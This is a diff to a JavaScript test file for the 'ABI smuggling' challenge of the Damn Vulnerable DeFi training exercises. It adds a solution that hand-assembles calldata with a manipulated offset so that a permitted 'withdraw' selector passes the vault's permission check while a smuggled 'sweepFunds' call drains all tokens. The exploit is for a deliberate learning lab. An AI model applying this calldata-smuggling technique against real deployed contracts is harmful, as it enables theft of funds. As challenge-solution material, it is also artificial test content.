@@ -4,12 +4,12 @@ const { expect } = require('chai');
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
     let token, vault;
-    
+
     const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [ deployer, player, recovery ] = await ethers.getSigners();
+        [deployer, player, recovery] = await ethers.getSigners();
 
         // Deploy Damn Valuable Token contract
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
@@ -45,6 +45,36 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a
+
+        // for how to encode bytes
+        // https://docs.soliditylang.org/en/latest/abi-spec.html
+
+        data = vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+
+        hexLists = []
+        // function selector
+        hexLists.push(vault.interface.getSighash("execute"));
+        // 1st argument of execute
+        hexLists.push(ethers.utils.hexZeroPad(vault.address, 32));
+        // offset to the start of 2nd argument
+        // offset = bytes size of (1st argument, this, next dummy, withdraw selector)
+        hexLists.push(ethers.utils.hexZeroPad(ethers.utils.hexValue(32 * 3 + 4), 32));
+        // dummy 32 bytes for smuggling
+        hexLists.push(ethers.utils.hexZeroPad(0, 32))
+        // function selector (pad to the right)
+        hexLists.push(vault.interface.getSighash("withdraw"))
+        // size of 2nd argument
+        hexLists.push(ethers.utils.hexZeroPad(ethers.utils.hexValue(ethers.utils.hexDataLength(data)), 32));
+        // 2nd argument
+        hexLists.push(data);
+
+        await player.sendTransaction({
+            to: vault.address,
+            gasLimit: 1e6,
+            data: ethers.utils.hexConcat(hexLists)
+        })
     });
 
     after(async function () {
